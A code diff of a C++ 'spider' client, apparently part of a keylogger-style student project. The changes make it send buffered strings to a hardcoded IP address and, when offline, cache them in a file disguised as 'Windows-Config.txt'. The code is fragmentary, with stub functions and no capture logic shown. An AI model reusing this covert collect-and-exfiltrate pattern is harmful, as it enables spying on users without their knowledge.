@@ -11,12 +11,14 @@
 #include <regex>
 #include <fstream>
 #include <iostream>
+#include <Thread/IThread.hpp>
+#include <Thread/BoostThread.hpp>
 #include "Protocol/BufferSender.hpp"
 #include "Protocol/ClientProtocol.hpp"
 
+std::atomic<bool> isConnected(false);
 
-spider::ClientProtocol::ClientProtocol(std::string const &host,
-				       unsigned short port) : _net(host, port)
+spider::ClientProtocol::ClientProtocol()
 {}
 
 spider::ClientProtocol::~ClientProtocol() {}
@@ -25,15 +27,12 @@ void spider::ClientProtocol::sendPing() {}
 
 void	spider::ClientProtocol::sendData() {}
 
-bool spider::ClientProtocol::connect()
+void runNetwork()
 {
-  try {
-    _net.connect();
-  } catch (std::exception const &e) {
-    //todo log
-    return false;
-  }
-  return true;
+  spider::ClientNetwork	_net("10.26.112.233", PORT);
+
+  _net.connect();
+  _net.run();
 }
 
 void spider::ClientProtocol::run()
@@ -41,6 +40,7 @@ void spider::ClientProtocol::run()
   BufferSender &buf = BufferSender::BufferSenderInstance();
   std::fstream file;
   std::string tmp;
+
   file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
   if (!file.is_open())
     std::cout << "can't open the file" << std::endl;
@@ -52,22 +52,24 @@ void spider::ClientProtocol::run()
     Sleep(200);
     if (str.empty())
       continue;
-    if (!_net.isConnected())
-      if (!connect())
-      {
-	std::cout << "writing in file\n";
-	file << str;
-	str.clear();
-      }
-    std::cout << "BITE" << std::endl;
-    _net.run();
-    std::cout << "BOOBIES" << std::endl;
+    if (!isConnected.load())
+    {
+      std::cout << "writing in file\n";
+      file << str;
+      str.clear();
+      continue;
+    }
     getline(file, tmp);
     std::cout << tmp << std::endl;
     tmp.append(str);
     str = tmp;
     std::cout << "here to send to server" << std::endl;
     std::cout << str << std::endl;
+
+    // push str to buf and add this part of code in handler;
+    buf.push(str);
+
+    // handlers have to change the value of the bool isConnected
     std::regex reg = std::regex("\\{(?:(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)\\}");
     for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
 	 it != std::sregex_iterator(); ++it)
